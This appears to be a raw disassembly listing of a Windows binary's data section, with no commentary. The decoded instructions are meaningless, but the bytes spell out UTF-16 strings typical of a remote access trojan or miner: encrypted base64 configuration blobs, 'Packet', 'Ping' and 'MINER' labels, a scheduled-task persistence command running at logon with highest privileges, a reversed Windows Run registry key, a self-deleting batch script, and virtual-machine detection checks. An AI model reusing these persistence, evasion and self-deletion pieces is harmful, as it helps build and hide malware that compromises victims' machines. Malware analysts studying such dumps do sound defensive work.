  40b048:	00 6b 00             	add    %ch,0x0(%ebx)
  40b04b:	78 00                	js     0x40b04d
  40b04d:	31 00                	xor    %eax,(%eax)
  40b04f:	59                   	pop    %ecx
  40b050:	00 55 00             	add    %dl,0x0(%ebp)
  40b053:	73 00                	jae    0x40b055
  40b055:	72 00                	jb     0x40b057
  40b057:	61                   	popa
  40b058:	00 70 00             	add    %dh,0x0(%eax)
  40b05b:	63 00                	arpl   %eax,(%eax)
  40b05d:	48                   	dec    %eax
  40b05e:	00 35 00 50 00 47    	add    %dh,0x47005000
  40b064:	00 69 00             	add    %ch,0x0(%ecx)
  40b067:	62 00                	bound  %eax,(%eax)
  40b069:	51                   	push   %ecx
  40b06a:	00 33                	add    %dh,(%ebx)
  40b06c:	00 6e 00             	add    %ch,0x0(%esi)
  40b06f:	4a                   	dec    %edx
  40b070:	00 33                	add    %dh,(%ebx)
  40b072:	00 78 00             	add    %bh,0x0(%eax)
  40b075:	53                   	push   %ebx
  40b076:	00 55 00             	add    %dl,0x0(%ebp)
  40b079:	36 00 54 00 38       	add    %dl,%ss:0x38(%eax,%eax,1)
  40b07e:	00 71 00             	add    %dh,0x0(%ecx)
  40b081:	6d                   	insl   (%dx),%es:(%edi)
  40b082:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
  40b086:	00 58 00             	add    %bl,0x0(%eax)
  40b089:	48                   	dec    %eax
  40b08a:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
  40b08e:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b094:	80 b1 55 00 5a 00 66 	xorb   $0x66,0x5a0055(%ecx)
  40b09b:	00 65 00             	add    %ah,0x0(%ebp)
  40b09e:	6a 00                	push   $0x0
  40b0a0:	6f                   	outsl  %ds:(%esi),(%dx)
  40b0a1:	00 39                	add    %bh,(%ecx)
  40b0a3:	00 2f                	add    %ch,(%edi)
  40b0a5:	00 4d 00             	add    %cl,0x0(%ebp)
  40b0a8:	4b                   	dec    %ebx
  40b0a9:	00 39                	add    %bh,(%ecx)
  40b0ab:	00 57 00             	add    %dl,0x0(%edi)
  40b0ae:	35 00 33 00 67       	xor    $0x67003300,%eax
  40b0b3:	00 71 00             	add    %dh,0x0(%ecx)
  40b0b6:	74 00                	je     0x40b0b8
  40b0b8:	59                   	pop    %ecx
  40b0b9:	00 69 00             	add    %ch,0x0(%ecx)
  40b0bc:	61                   	popa
  40b0bd:	00 78 00             	add    %bh,0x0(%eax)
  40b0c0:	4c                   	dec    %esp
  40b0c1:	00 41 00             	add    %al,0x0(%ecx)
  40b0c4:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  40b0c8:	70 00                	jo     0x40b0ca
  40b0ca:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  40b0ce:	6d                   	insl   (%dx),%es:(%edi)
  40b0cf:	00 42 00             	add    %al,0x0(%edx)
  40b0d2:	4d                   	dec    %ebp
  40b0d3:	00 38                	add    %bh,(%eax)
  40b0d5:	00 73 00             	add    %dh,0x0(%ebx)
  40b0d8:	36 00 38             	add    %bh,%ss:(%eax)
  40b0db:	00 6b 00             	add    %ch,0x0(%ebx)
  40b0de:	43                   	inc    %ebx
  40b0df:	00 72 00             	add    %dh,0x0(%edx)
  40b0e2:	6e                   	outsb  %ds:(%esi),(%dx)
  40b0e3:	00 4e 00             	add    %cl,0x0(%esi)
  40b0e6:	4b                   	dec    %ebx
  40b0e7:	00 62 00             	add    %ah,0x0(%edx)
  40b0ea:	71 00                	jno    0x40b0ec
  40b0ec:	2b 00                	sub    (%eax),%eax
  40b0ee:	42                   	inc    %edx
  40b0ef:	00 58 00             	add    %bl,0x0(%eax)
  40b0f2:	36 00 2b             	add    %ch,%ss:(%ebx)
  40b0f5:	00 36                	add    %dh,(%esi)
  40b0f7:	00 52 00             	add    %dl,0x0(%edx)
  40b0fa:	35 00 6f 00 69       	xor    $0x69006f00,%eax
  40b0ff:	00 71 00             	add    %dh,0x0(%ecx)
  40b102:	42                   	inc    %edx
  40b103:	00 2b                	add    %ch,(%ebx)
  40b105:	00 70 00             	add    %dh,0x0(%eax)
  40b108:	7a 00                	jp     0x40b10a
  40b10a:	5a                   	pop    %edx
  40b10b:	00 73 00             	add    %dh,0x0(%ebx)
  40b10e:	41                   	inc    %ecx
  40b10f:	00 32                	add    %dh,(%edx)
  40b111:	00 41 00             	add    %al,0x0(%ecx)
  40b114:	79 00                	jns    0x40b116
  40b116:	74 00                	je     0x40b118
  40b118:	68 00 2f 00 47       	push   $0x47002f00
  40b11d:	00 78 00             	add    %bh,0x0(%eax)
  40b120:	62 00                	bound  %eax,(%eax)
  40b122:	44                   	inc    %esp
  40b123:	00 62 00             	add    %ah,0x0(%edx)
  40b126:	66 00 31             	data16 add %dh,(%ecx)
  40b129:	00 53 00             	add    %dl,0x0(%ebx)
  40b12c:	4e                   	dec    %esi
  40b12d:	00 57 00             	add    %dl,0x0(%edi)
  40b130:	4a                   	dec    %edx
  40b131:	00 35 00 57 00 71    	add    %dh,0x71005700
  40b137:	00 30                	add    %dh,(%eax)
  40b139:	00 36                	add    %dh,(%esi)
  40b13b:	00 5a 00             	add    %bl,0x0(%edx)
  40b13e:	5a                   	pop    %edx
  40b13f:	00 67 00             	add    %ah,0x0(%edi)
  40b142:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b147:	80 b1 52 00 72 00 7a 	xorb   $0x7a,0x720052(%ecx)
  40b14e:	00 61 00             	add    %ah,0x0(%ecx)
  40b151:	6f                   	outsl  %ds:(%esi),(%dx)
  40b152:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40b156:	00 63 00             	add    %ah,0x0(%ebx)
  40b159:	61                   	popa
  40b15a:	00 62 00             	add    %ah,0x0(%edx)
  40b15d:	51                   	push   %ecx
  40b15e:	00 42 00             	add    %al,0x0(%edx)
  40b161:	6e                   	outsb  %ds:(%esi),(%dx)
  40b162:	00 4b 00             	add    %cl,0x0(%ebx)
  40b165:	66 00 33             	data16 add %dh,(%ebx)
  40b168:	00 62 00             	add    %ah,0x0(%edx)
  40b16b:	37                   	aaa
  40b16c:	00 75 00             	add    %dh,0x0(%ebp)
  40b16f:	4b                   	dec    %ebx
  40b170:	00 4e 00             	add    %cl,0x0(%esi)
  40b173:	4d                   	dec    %ebp
  40b174:	00 75 00             	add    %dh,0x0(%ebp)
  40b177:	4e                   	dec    %esi
  40b178:	00 65 00             	add    %ah,0x0(%ebp)
  40b17b:	50                   	push   %eax
  40b17c:	00 44 00 55          	add    %al,0x55(%eax,%eax,1)
  40b180:	00 5a 00             	add    %bl,0x0(%edx)
  40b183:	72 00                	jb     0x40b185
  40b185:	55                   	push   %ebp
  40b186:	00 6c 00 53          	add    %ch,0x53(%eax,%eax,1)
  40b18a:	00 67 00             	add    %ah,0x0(%edi)
  40b18d:	38 00                	cmp    %al,(%eax)
  40b18f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b190:	00 59 00             	add    %bl,0x0(%ecx)
  40b193:	66 00 65 00          	data16 add %ah,0x0(%ebp)
  40b197:	4d                   	dec    %ebp
  40b198:	00 76 00             	add    %dh,0x0(%esi)
  40b19b:	4a                   	dec    %edx
  40b19c:	00 75 00             	add    %dh,0x0(%ebp)
  40b19f:	50                   	push   %eax
  40b1a0:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b1a3:	4e                   	dec    %esi
  40b1a4:	00 36                	add    %dh,(%esi)
  40b1a6:	00 30                	add    %dh,(%eax)
  40b1a8:	00 78 00             	add    %bh,0x0(%eax)
  40b1ab:	74 00                	je     0x40b1ad
  40b1ad:	4b                   	dec    %ebx
  40b1ae:	00 50 00             	add    %dl,0x0(%eax)
  40b1b1:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1b2:	00 30                	add    %dh,(%eax)
  40b1b4:	00 55 00             	add    %dl,0x0(%ebp)
  40b1b7:	79 00                	jns    0x40b1b9
  40b1b9:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1ba:	00 4e 00             	add    %cl,0x0(%esi)
  40b1bd:	2f                   	das
  40b1be:	00 43 00             	add    %al,0x0(%ebx)
  40b1c1:	54                   	push   %esp
  40b1c2:	00 4f 00             	add    %cl,0x0(%edi)
  40b1c5:	38 00                	cmp    %al,(%eax)
  40b1c7:	2f                   	das
  40b1c8:	00 4f 00             	add    %cl,0x0(%edi)
  40b1cb:	44                   	inc    %esp
  40b1cc:	00 70 00             	add    %dh,0x0(%eax)
  40b1cf:	4f                   	dec    %edi
  40b1d0:	00 65 00             	add    %ah,0x0(%ebp)
  40b1d3:	68 00 56 00 31       	push   $0x31005600
  40b1d8:	00 54 00 49          	add    %dl,0x49(%eax,%eax,1)
  40b1dc:	00 4f 00             	add    %cl,0x0(%edi)
  40b1df:	70 00                	jo     0x40b1e1
  40b1e1:	48                   	dec    %eax
  40b1e2:	00 49 00             	add    %cl,0x0(%ecx)
  40b1e5:	2f                   	das
  40b1e6:	00 32                	add    %dh,(%edx)
  40b1e8:	00 42 00             	add    %al,0x0(%edx)
  40b1eb:	55                   	push   %ebp
  40b1ec:	00 48 00             	add    %cl,0x0(%eax)
  40b1ef:	4d                   	dec    %ebp
  40b1f0:	00 4f 00             	add    %cl,0x0(%edi)
  40b1f3:	41                   	inc    %ecx
  40b1f4:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b1fa:	80 b1 69 00 4b 00 4f 	xorb   $0x4f,0x4b0069(%ecx)
  40b201:	00 56 00             	add    %dl,0x0(%esi)
  40b204:	34 00                	xor    $0x0,%al
  40b206:	63 00                	arpl   %eax,(%eax)
  40b208:	41                   	inc    %ecx
  40b209:	00 52 00             	add    %dl,0x0(%edx)
  40b20c:	2f                   	das
  40b20d:	00 76 00             	add    %dh,0x0(%esi)
  40b210:	37                   	aaa
  40b211:	00 39                	add    %bh,(%ecx)
  40b213:	00 69 00             	add    %ch,0x0(%ecx)
  40b216:	4b                   	dec    %ebx
  40b217:	00 43 00             	add    %al,0x0(%ebx)
  40b21a:	68 00 66 00 31       	push   $0x31006600
  40b21f:	00 75 00             	add    %dh,0x0(%ebp)
  40b222:	65 00 68 00          	add    %ch,%gs:0x0(%eax)
  40b226:	42                   	inc    %edx
  40b227:	00 4d 00             	add    %cl,0x0(%ebp)
  40b22a:	67 00 4e 00          	add    %cl,0x0(%bp)
  40b22e:	44                   	inc    %esp
  40b22f:	00 6f 00             	add    %ch,0x0(%edi)
  40b232:	34 00                	xor    $0x0,%al
  40b234:	76 00                	jbe    0x40b236
  40b236:	63 00                	arpl   %eax,(%eax)
  40b238:	4f                   	dec    %edi
  40b239:	00 79 00             	add    %bh,0x0(%ecx)
  40b23c:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  40b23f:	00 75 00             	add    %dh,0x0(%ebp)
  40b242:	6b 00 49             	imul   $0x49,(%eax),%eax
  40b245:	00 4a 00             	add    %cl,0x0(%edx)
  40b248:	47                   	inc    %edi
  40b249:	00 44 00 53          	add    %al,0x53(%eax,%eax,1)
  40b24d:	00 6d 00             	add    %ch,0x0(%ebp)
  40b250:	35 00 6b 00 34       	xor    $0x34006b00,%eax
  40b255:	00 2b                	add    %ch,(%ebx)
  40b257:	00 41 00             	add    %al,0x0(%ecx)
  40b25a:	54                   	push   %esp
  40b25b:	00 33                	add    %dh,(%ebx)
  40b25d:	00 33                	add    %dh,(%ebx)
  40b25f:	00 6d 00             	add    %ch,0x0(%ebp)
  40b262:	67 00 58 00          	add    %bl,0x0(%bx,%si)
  40b266:	2f                   	das
  40b267:	00 5a 00             	add    %bl,0x0(%edx)
  40b26a:	70 00                	jo     0x40b26c
  40b26c:	46                   	inc    %esi
  40b26d:	00 36                	add    %dh,(%esi)
  40b26f:	00 6e 00             	add    %ch,0x0(%esi)
  40b272:	34 00                	xor    $0x0,%al
  40b274:	68 00 68 00 72       	push   $0x72006800
  40b279:	00 4a 00             	add    %cl,0x0(%edx)
  40b27c:	54                   	push   %esp
  40b27d:	00 6b 00             	add    %ch,0x0(%ebx)
  40b280:	75 00                	jne    0x40b282
  40b282:	48                   	dec    %eax
  40b283:	00 74 00 7a          	add    %dh,0x7a(%eax,%eax,1)
  40b287:	00 7a 00             	add    %bh,0x0(%edx)
  40b28a:	74 00                	je     0x40b28c
  40b28c:	61                   	popa
  40b28d:	00 44 00 35          	add    %al,0x35(%eax,%eax,1)
  40b291:	00 66 00             	add    %ah,0x0(%esi)
  40b294:	6f                   	outsl  %ds:(%esi),(%dx)
  40b295:	00 65 00             	add    %ah,0x0(%ebp)
  40b298:	78 00                	js     0x40b29a
  40b29a:	68 00 41 00 58       	push   $0x58004100
  40b29f:	00 6b 00             	add    %ch,0x0(%ebx)
  40b2a2:	6b 00 6e             	imul   $0x6e,(%eax),%eax
  40b2a5:	00 51 00             	add    %dl,0x0(%ecx)
  40b2a8:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b2ad:	01 00                	add    %eax,(%eax)
  40b2af:	03 35 00 00 09 6e    	add    0x6e090000,%esi
  40b2b5:	00 75 00             	add    %dh,0x0(%ebp)
  40b2b8:	6c                   	insb   (%dx),%es:(%edi)
  40b2b9:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b2bd:	03 3a                	add    (%edx),%edi
  40b2bf:	00 00                	add    %al,(%eax)
  40b2c1:	0d 50 00 61 00       	or     $0x610050,%eax
  40b2c6:	63 00                	arpl   %eax,(%eax)
  40b2c8:	6b 00 65             	imul   $0x65,(%eax),%eax
  40b2cb:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b2cf:	09 50 00             	or     %edx,0x0(%eax)
  40b2d2:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40b2d8:	00 0f                	add    %cl,(%edi)
  40b2da:	4d                   	dec    %ebp
  40b2db:	00 65 00             	add    %ah,0x0(%ebp)
  40b2de:	73 00                	jae    0x40b2e0
  40b2e0:	73 00                	jae    0x40b2e2
  40b2e2:	61                   	popa
  40b2e3:	00 67 00             	add    %ah,0x0(%edi)
  40b2e6:	65 00 00             	add    %al,%gs:(%eax)
  40b2e9:	0d 4d 00 49 00       	or     $0x49004d,%eax
  40b2ee:	4e                   	dec    %esi
  40b2ef:	00 45 00             	add    %al,0x0(%ebp)
  40b2f2:	52                   	push   %edx
  40b2f3:	00 20                	add    %ah,(%eax)
  40b2f5:	00 00                	add    %al,(%eax)
  40b2f7:	03 30                	add    (%eax),%esi
  40b2f9:	00 00                	add    %al,(%eax)
  40b2fb:	0f 7b                	(bad)
  40b2fd:	00 30                	add    %dh,(%eax)
  40b2ff:	00 3a                	add    %bh,(%edx)
  40b301:	00 44 00 33          	add    %al,0x33(%eax,%eax,1)
  40b305:	00 7d 00             	add    %bh,0x0(%ebp)
  40b308:	20 00                	and    %al,(%eax)
  40b30a:	00 0f                	add    %cl,(%edi)
  40b30c:	7b 00                	jnp    0x40b30e
  40b30e:	30 00                	xor    %al,(%eax)
  40b310:	3a 00                	cmp    (%eax),%al
  40b312:	58                   	pop    %eax
  40b313:	00 32                	add    %dh,(%edx)
  40b315:	00 7d 00             	add    %bh,0x0(%ebp)
  40b318:	20 00                	and    %al,(%eax)
  40b31a:	00 2b                	add    %ch,(%ebx)
  40b31c:	28 00                	sub    %al,(%eax)
  40b31e:	6e                   	outsb  %ds:(%esi),(%dx)
  40b31f:	00 65 00             	add    %ah,0x0(%ebp)
  40b322:	76 00                	jbe    0x40b324
  40b324:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b328:	20 00                	and    %al,(%eax)
  40b32a:	75 00                	jne    0x40b32c
  40b32c:	73 00                	jae    0x40b32e
  40b32e:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40b333:	00 20                	add    %ah,(%eax)
  40b335:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40b339:	00 70 00             	add    %dh,0x0(%eax)
  40b33c:	65 00 20             	add    %ah,%gs:(%eax)
  40b33f:	00 24 00             	add    %ah,(%eax,%eax,1)
  40b342:	63 00                	arpl   %eax,(%eax)
  40b344:	31 00                	xor    %eax,(%eax)
  40b346:	00 45 28             	add    %al,0x28(%ebp)
  40b349:	00 65 00             	add    %ah,0x0(%ebp)
  40b34c:	78 00                	js     0x40b34e
  40b34e:	74 00                	je     0x40b350
  40b350:	38 00                	cmp    %al,(%eax)
  40b352:	2c 00                	sub    $0x0,%al
  40b354:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40b358:	74 00                	je     0x40b35a
  40b35a:	31 00                	xor    %eax,(%eax)
  40b35c:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40b360:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40b364:	33 00                	xor    (%eax),%eax
  40b366:	32 00                	xor    (%eax),%al
  40b368:	29 00                	sub    %eax,(%eax)
  40b36a:	20 00                	and    %al,(%eax)
  40b36c:	74 00                	je     0x40b36e
  40b36e:	79 00                	jns    0x40b370
  40b370:	70 00                	jo     0x40b372
  40b372:	65 00 20             	add    %ah,%gs:(%eax)
  40b375:	00 24 00             	add    %ah,(%eax,%eax,1)
  40b378:	63 00                	arpl   %eax,(%eax)
  40b37a:	37                   	aaa
  40b37b:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40b37e:	24 00                	and    $0x0,%al
  40b380:	63 00                	arpl   %eax,(%eax)
  40b382:	38 00                	cmp    %al,(%eax)
  40b384:	2c 00                	sub    $0x0,%al
  40b386:	24 00                	and    $0x0,%al
  40b388:	63 00                	arpl   %eax,(%eax)
  40b38a:	39 00                	cmp    %eax,(%eax)
  40b38c:	00 19                	add    %bl,(%ecx)
  40b38e:	73 00                	jae    0x40b390
  40b390:	63 00                	arpl   %eax,(%eax)
  40b392:	68 00 74 00 61       	push   $0x61007400
  40b397:	00 73 00             	add    %dh,0x0(%ebx)
  40b39a:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b39d:	00 2e                	add    %ch,(%esi)
  40b39f:	00 65 00             	add    %ah,0x0(%ebp)
  40b3a2:	78 00                	js     0x40b3a4
  40b3a4:	65 00 00             	add    %al,%gs:(%eax)
  40b3a7:	53                   	push   %ebx
  40b3a8:	2f                   	das
  40b3a9:	00 63 00             	add    %ah,0x0(%ebx)
  40b3ac:	72 00                	jb     0x40b3ae
  40b3ae:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40b3b2:	74 00                	je     0x40b3b4
  40b3b4:	65 00 20             	add    %ah,%gs:(%eax)
  40b3b7:	00 2f                	add    %ch,(%edi)
  40b3b9:	00 66 00             	add    %ah,0x0(%esi)
  40b3bc:	20 00                	and    %al,(%eax)
  40b3be:	2f                   	das
  40b3bf:	00 73 00             	add    %dh,0x0(%ebx)
  40b3c2:	63 00                	arpl   %eax,(%eax)
  40b3c4:	20 00                	and    %al,(%eax)
  40b3c6:	4f                   	dec    %edi
  40b3c7:	00 4e 00             	add    %cl,0x0(%esi)
  40b3ca:	4c                   	dec    %esp
  40b3cb:	00 4f 00             	add    %cl,0x0(%edi)
  40b3ce:	47                   	inc    %edi
  40b3cf:	00 4f 00             	add    %cl,0x0(%edi)
  40b3d2:	4e                   	dec    %esi
  40b3d3:	00 20                	add    %ah,(%eax)
  40b3d5:	00 2f                	add    %ch,(%edi)
  40b3d7:	00 52 00             	add    %dl,0x0(%edx)
  40b3da:	4c                   	dec    %esp
  40b3db:	00 20                	add    %ah,(%eax)
  40b3dd:	00 48 00             	add    %cl,0x0(%eax)
  40b3e0:	49                   	dec    %ecx
  40b3e1:	00 47 00             	add    %al,0x0(%edi)
  40b3e4:	48                   	dec    %eax
  40b3e5:	00 45 00             	add    %al,0x0(%ebp)
  40b3e8:	53                   	push   %ebx
  40b3e9:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40b3ed:	00 2f                	add    %ch,(%edi)
  40b3ef:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40b3f3:	00 20                	add    %ah,(%eax)
  40b3f5:	00 22                	add    %ah,(%edx)
  40b3f7:	00 27                	add    %ah,(%edi)
  40b3f9:	00 01                	add    %al,(%ecx)
  40b3fb:	13 22                	adc    (%edx),%esp
  40b3fd:	00 27                	add    %ah,(%edi)
  40b3ff:	00 20                	add    %ah,(%eax)
  40b401:	00 2f                	add    %ch,(%edi)
  40b403:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40b407:	00 20                	add    %ah,(%eax)
  40b409:	00 22                	add    %ah,(%edx)
  40b40b:	00 27                	add    %ah,(%edi)
  40b40d:	00 01                	add    %al,(%ecx)
  40b40f:	05 22 00 27 00       	add    $0x270022,%eax
  40b414:	01 5d 5c             	add    %ebx,0x5c(%ebp)
  40b417:	00 6e 00             	add    %ch,0x0(%esi)
  40b41a:	75 00                	jne    0x40b41c
  40b41c:	52                   	push   %edx
  40b41d:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40b421:	00 6f 00             	add    %ch,0x0(%edi)
  40b424:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40b42a:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40b42e:	74 00                	je     0x40b430
  40b430:	6e                   	outsb  %ds:(%esi),(%dx)
  40b431:	00 65 00             	add    %ah,0x0(%ebp)
  40b434:	72 00                	jb     0x40b436
  40b436:	72 00                	jb     0x40b438
  40b438:	75 00                	jne    0x40b43a
  40b43a:	43                   	inc    %ebx
  40b43b:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40b43f:	00 77 00             	add    %dh,0x0(%edi)
  40b442:	6f                   	outsl  %ds:(%esi),(%dx)
  40b443:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40b447:	00 69 00             	add    %ch,0x0(%ecx)
  40b44a:	57                   	push   %edi
  40b44b:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40b44f:	00 66 00             	add    %ah,0x0(%esi)
  40b452:	6f                   	outsl  %ds:(%esi),(%dx)
  40b453:	00 73 00             	add    %dh,0x0(%ebx)
  40b456:	6f                   	outsl  %ds:(%esi),(%dx)
  40b457:	00 72 00             	add    %dh,0x0(%edx)
  40b45a:	63 00                	arpl   %eax,(%eax)
  40b45c:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40b462:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b466:	61                   	popa
  40b467:	00 77 00             	add    %dh,0x0(%edi)
  40b46a:	74 00                	je     0x40b46c
  40b46c:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b470:	53                   	push   %ebx
  40b471:	00 00                	add    %al,(%eax)
  40b473:	03 22                	add    (%edx),%esp
  40b475:	00 00                	add    %al,(%eax)
  40b477:	09 2e                	or     %ebp,(%esi)
  40b479:	00 62 00             	add    %ah,0x0(%edx)
  40b47c:	61                   	popa
  40b47d:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b481:	13 40 00             	adc    0x0(%eax),%eax
  40b484:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b488:	68 00 6f 00 20       	push   $0x20006f00
  40b48d:	00 6f 00             	add    %ch,0x0(%edi)
  40b490:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40b494:	00 1f                	add    %bl,(%edi)
  40b496:	74 00                	je     0x40b498
  40b498:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40b49e:	6f                   	outsl  %ds:(%esi),(%dx)
  40b49f:	00 75 00             	add    %dh,0x0(%ebp)
  40b4a2:	74 00                	je     0x40b4a4
  40b4a4:	20 00                	and    %al,(%eax)
  40b4a6:	33 00                	xor    (%eax),%eax
  40b4a8:	20 00                	and    %al,(%eax)
  40b4aa:	3e 00 20             	add    %ah,%ds:(%eax)
  40b4ad:	00 4e 00             	add    %cl,0x0(%esi)
  40b4b0:	55                   	push   %ebp
  40b4b1:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b4b5:	15 53 00 54 00       	adc    $0x540053,%eax
  40b4ba:	41                   	inc    %ecx
  40b4bb:	00 52 00             	add    %dl,0x0(%edx)
  40b4be:	54                   	push   %esp
  40b4bf:	00 20                	add    %ah,(%eax)
  40b4c1:	00 22                	add    %ah,(%edx)
  40b4c3:	00 22                	add    %ah,(%edx)
  40b4c5:	00 20                	add    %ah,(%eax)
  40b4c7:	00 22                	add    %ah,(%edx)
  40b4c9:	00 00                	add    %al,(%eax)
  40b4cb:	07                   	pop    %es
  40b4cc:	43                   	inc    %ebx
  40b4cd:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40b4d1:	00 00                	add    %al,(%eax)
  40b4d3:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40b4d7:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40b4db:	00 22                	add    %ah,(%edx)
  40b4dd:	00 00                	add    %al,(%eax)
  40b4df:	0f 22 00             	mov    %eax,%cr0
  40b4e2:	20 00                	and    %al,(%eax)
  40b4e4:	2f                   	das
  40b4e5:	00 66 00             	add    %ah,0x0(%esi)
  40b4e8:	20 00                	and    %al,(%eax)
  40b4ea:	2f                   	das
  40b4eb:	00 71 00             	add    %dh,0x0(%ecx)
  40b4ee:	00 05 78 00 70 00    	add    %al,0x700078
  40b4f4:	00 45 53             	add    %al,0x53(%ebp)
  40b4f7:	00 65 00             	add    %ah,0x0(%ebp)
  40b4fa:	6c                   	insb   (%dx),%es:(%edi)
  40b4fb:	00 65 00             	add    %ah,0x0(%ebp)
  40b4fe:	63 00                	arpl   %eax,(%eax)
  40b500:	74 00                	je     0x40b502
  40b502:	20 00                	and    %al,(%eax)
  40b504:	2a 00                	sub    (%eax),%al
  40b506:	20 00                	and    %al,(%eax)
  40b508:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40b50c:	6f                   	outsl  %ds:(%esi),(%dx)
  40b50d:	00 6d 00             	add    %ch,0x0(%ebp)
  40b510:	20 00                	and    %al,(%eax)
  40b512:	57                   	push   %edi
  40b513:	00 69 00             	add    %ch,0x0(%ecx)
  40b516:	6e                   	outsb  %ds:(%esi),(%dx)
  40b517:	00 33                	add    %dh,(%ebx)
  40b519:	00 32                	add    %dh,(%edx)
  40b51b:	00 5f 00             	add    %bl,0x0(%edi)
  40b51e:	43                   	inc    %ebx
  40b51f:	00 6f 00             	add    %ch,0x0(%edi)
  40b522:	6d                   	insl   (%dx),%es:(%edi)
  40b523:	00 70 00             	add    %dh,0x0(%eax)
  40b526:	75 00                	jne    0x40b528
  40b528:	74 00                	je     0x40b52a
  40b52a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b52e:	53                   	push   %ebx
  40b52f:	00 79 00             	add    %bh,0x0(%ecx)
  40b532:	73 00                	jae    0x40b534
  40b534:	74 00                	je     0x40b536
  40b536:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40b53a:	00 19                	add    %bl,(%ecx)
  40b53c:	4d                   	dec    %ebp
  40b53d:	00 61 00             	add    %ah,0x0(%ecx)
  40b540:	6e                   	outsb  %ds:(%esi),(%dx)
  40b541:	00 75 00             	add    %dh,0x0(%ebp)
  40b544:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40b548:	63 00                	arpl   %eax,(%eax)
  40b54a:	74 00                	je     0x40b54c
  40b54c:	75 00                	jne    0x40b54e
  40b54e:	72 00                	jb     0x40b550
  40b550:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b554:	00 2b                	add    %ch,(%ebx)
  40b556:	6d                   	insl   (%dx),%es:(%edi)
  40b557:	00 69 00             	add    %ch,0x0(%ecx)
  40b55a:	63 00                	arpl   %eax,(%eax)
  40b55c:	72 00                	jb     0x40b55e
  40b55e:	6f                   	outsl  %ds:(%esi),(%dx)
  40b55f:	00 73 00             	add    %dh,0x0(%ebx)
  40b562:	6f                   	outsl  %ds:(%esi),(%dx)
  40b563:	00 66 00             	add    %ah,0x0(%esi)
  40b566:	74 00                	je     0x40b568
  40b568:	20 00                	and    %al,(%eax)
  40b56a:	63 00                	arpl   %eax,(%eax)
  40b56c:	6f                   	outsl  %ds:(%esi),(%dx)
  40b56d:	00 72 00             	add    %dh,0x0(%edx)
  40b570:	70 00                	jo     0x40b572
  40b572:	6f                   	outsl  %ds:(%esi),(%dx)
  40b573:	00 72 00             	add    %dh,0x0(%edx)
  40b576:	61                   	popa
  40b577:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b57b:	00 6f 00             	add    %ch,0x0(%edi)
  40b57e:	6e                   	outsb  %ds:(%esi),(%dx)
  40b57f:	00 00                	add    %al,(%eax)
  40b581:	0b 4d 00             	or     0x0(%ebp),%ecx
  40b584:	6f                   	outsl  %ds:(%esi),(%dx)
  40b585:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b589:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b58d:	0f 56 00             	orps   (%eax),%xmm0
  40b590:	49                   	dec    %ecx
  40b591:	00 52 00             	add    %dl,0x0(%edx)
  40b594:	54                   	push   %esp
  40b595:	00 55 00             	add    %dl,0x0(%ebp)
  40b598:	41                   	inc    %ecx
  40b599:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b59d:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40b5a2:	77 00                	ja     0x40b5a4
  40b5a4:	61                   	popa
  40b5a5:	00 72 00             	add    %dh,0x0(%edx)
  40b5a8:	65 00 00             	add    %al,%gs:(%eax)
  40b5ab:	15 56 00 69 00       	adc    $0x690056,%eax
  40b5b0:	72 00                	jb     0x40b5b2
  40b5b2:	74 00                	je     0x40b5b4
  40b5b4:	75 00                	jne    0x40b5b6
  40b5b6:	61                   	popa
